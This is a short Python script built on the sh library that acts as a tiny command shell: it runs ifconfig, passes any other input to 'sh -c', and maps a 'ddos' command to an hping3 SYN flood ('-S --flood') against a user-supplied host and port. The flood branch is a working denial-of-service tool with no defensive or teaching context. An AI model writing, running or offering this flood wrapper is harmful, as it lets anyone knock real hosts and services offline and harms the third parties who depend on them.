from sh import sh
from sh import ErrorReturnCode
from sh import Command as Cmd
from sh import ifconfig
from sh import hping3





command_ = input("r$ ")

if command_ == "ifconfig":
    ifconfig("-a")
elif command_.split(" ")[0] == "ddos":
    hping3("-S", "--flood", "--force-icmp", "--destport", "{}".format(command_.split(" ")[2]), command_.split(" ")[1])


else:
    print(sh("-c",command_))
